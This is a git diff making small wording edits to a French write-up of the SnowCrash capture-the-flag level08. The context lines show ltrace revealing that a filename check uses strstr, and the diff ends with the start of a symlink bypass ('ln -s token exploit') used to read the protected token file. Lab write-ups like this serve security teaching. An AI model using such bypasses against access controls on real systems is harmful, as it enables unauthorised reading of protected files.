@@ -25,7 +25,7 @@ toto
 
 ```
 
-le binaire `level08` permet de lire le contenu d'un fichier, mais il y'a une sécurité protegeant le fichier `token`
+Le binaire `level08` permet de lire le contenu d'un fichier, mais il y'a une sécurité protegeant le fichier `token`...
 
 ```
 ltrace ./level08 token 
@@ -36,7 +36,7 @@ printf("You may not access '%s'\n", "token"You may not access 'token'
 exit(1 <unfinished ...>
 ```
 
-Apparement un simple `strstr` sur le nom du fichier. 
+... apparement un simple `strstr` sur le nom du fichier. 
 
 ```
 level08@SnowCrash:~$ ln -s token exploit
